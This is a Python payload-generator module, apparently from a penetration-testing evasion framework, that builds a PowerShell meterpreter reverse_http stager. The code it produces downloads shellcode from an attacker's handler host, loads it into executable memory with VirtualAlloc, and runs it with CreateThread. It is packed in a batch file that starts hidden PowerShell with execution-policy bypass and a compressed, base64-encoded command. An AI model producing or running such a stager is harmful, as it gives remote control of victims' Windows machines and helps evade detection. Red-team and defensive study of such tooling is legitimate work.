"""

Custom-written pure powershell meterpreter/reverse_http stager.

Module by @harmj0y

"""

from modules.common import helpers


class Payload:

    def __init__(self):
        # required options
        self.description = "pure windows/meterpreter/reverse_http stager, no shellcode"
        self.rating = "Excellent"
        self.language = "powershell"
        self.extension = "bat"

        # optional
        self.required_options = {
                                    "LHOST" : ["", "IP of the Metasploit handler"],
                                    "LPORT" : ["8080", "Port of the Metasploit handler"],
                                    "PROXY" : ["N", "Use system proxy settings"],
                                    "STAGERURILENGTH" : ["4", "The URI length for the stager (at least 4 chars)."],
                                    "LURI" : ["/","The HTTP path to prepend to the listener. Ex: http://attacker:port/[LURI]"],
                                    "USER_AGENT" : ["Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)", "The User-Agent header to send with the initial stager request"]
                                }


    def generate(self):
        proxyString = "$pr = [System.Net.WebRequest]::GetSystemWebProxy();$pr.Credentials=[System.Net.CredentialCache]::DefaultCredentials;$m.proxy=$pr;$m.UseDefaultCredentials=$true;"
        baseString = """$q = @"
[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
"@
try{$d = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".ToCharArray()
function c($v){ return (([int[]] $v.ToCharArray() | Measure-Object -Sum).Sum %% 0x100 -eq 92)}
function t {$f = "";1..%i|foreach-object{$f+= $d[(get-random -maximum $d.Length)]};return $f;}
function e { process {[array]$x = $x + $_}; end {$x | sort-object {(new-object Random).next()}}}
function g{ for ($i=0;$i -lt 64;$i++){$h = t;$k = $d | e;  foreach ($l in $k){$s = $h + $l; if (c($s)) { return $s }}}return "9vXU";}
$m = New-Object System.Net.WebClient;%s$m.Headers.Add("user-agent", "%s")
$n = g; [Byte[]] $p = $m.DownloadData("http://%s:%s/%s$n" )
$o = Add-Type -memberDefinition $q -Name "Win32" -namespace Win32Functions -passthru
$x=$o::VirtualAlloc(0,$p.Length,0x3000,0x40);[System.Runtime.InteropServices.Marshal]::Copy($p, 0, [IntPtr]($x.ToInt32()), $p.Length)
$o::CreateThread(0,0,$x,0,0,0) | out-null; Start-Sleep -Second 86400}catch{}""" %((int(self.required_options["STAGERURILENGTH"][0])-1),
                                                                              "" if self.required_options["PROXY"][0] == "N" else proxyString,
                                                                              self.required_options["USER_AGENT"][0],
                                                                              self.required_options["LHOST"][0], 
                                                                              self.required_options["LPORT"][0],
                                                                              "" if self.required_options["LURI"][0] == "/" else "%s/" % self.required_options["LURI"][0])                                                                             
        encoded = helpers.deflate(baseString)
        payloadCode = "@echo off\n"
        payloadCode += "if %PROCESSOR_ARCHITECTURE%==x86 ("
        payloadCode += "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\\\"%s\\\")))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();\"" % (encoded)
        payloadCode += ") else ("
        payloadCode += "%%WinDir%%\\syswow64\\windowspowershell\\v1.0\\powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\\\"%s\\\")))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();\")" % (encoded)

        return payloadCode
